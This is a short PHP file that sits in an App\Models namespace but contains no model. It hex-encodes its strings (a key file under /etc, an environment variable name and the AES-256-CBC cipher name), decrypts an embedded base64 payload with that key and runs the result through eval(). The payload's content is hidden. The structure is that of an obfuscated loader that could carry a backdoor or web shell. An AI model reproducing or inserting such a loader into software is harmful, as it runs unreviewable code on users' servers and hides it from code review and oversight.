<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Xdv9n+X/Zh6OK3HObbcC0Q==');

$c=base64_decode(

'Kvpt6n7XHKC+sokYulttoNQ5AhEW8i4ZmZp5KPVVSfK+Lh6fcdvrhVTIhkDzGrQ6pslrZOwsQ8dx' .
'u5hgOMMbPsRoOt15rfWFgY2WAxSIk0w4t+4Vovl0O7S3SSJCvHWn2Bu5aRNEONYfQlHwNbH5zXZZ' .
'G6eHtq3iREwhHbqUjrwfopwt9pNM7HUZYVwKxxDXOggWyOJqsEXwRdieRJneJbOCnNGEF42Az0cV' .
'JSkR9yYi8Q00422Y5QklQnvOQ6U+0xD3bAwsf5Ljw2f4gBfA+MhYGrLDr2V1YSZFOVuwfmqxar9z' .
'9X/wmWL3iCMYUFEZVhIZaQtfyKLsM5QHoH1gB/zXwhXaZHcnJFinKC3tVBajaYxZ5UGVP6JPSrfv' .
'GpEUJnz14LaawMmuOXMMunwHsZZpDcrcvOb1wgySo6xc+6C/5uqWCqK5z/aAWI8B+Rtuixgj7bah' .
'i8Eviqo8r98lM2jTLL8M06GYAuVJzMYrAGCcde4R6+fyS18ThISGaTAT3XorO1l33sJn21CwMyED' .
'VhhfluS3KGQwjGXantyCaACOdlkSf+qNflLewhlHNyIcRkKwk67i1xNUMIpJtLsoRz+sda+SWO+Q' .
'hXWG5rjxyL1tMmaa9aslO/3+aPUqHLINLw1CdUqp9PkFYU+vvC7SAScq7L+M9JegBAsgAoLF07GK' .
'k/NX5hjZmnSTlQhWmQ3/WkVaeqlaw8L731MpFZmRXFNYQSwwLCcwpBVFAS81I//9pNgXLiJd462F' .
'Ej93Bm35f5mroTDpEbfsYaf4LxG4/A=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

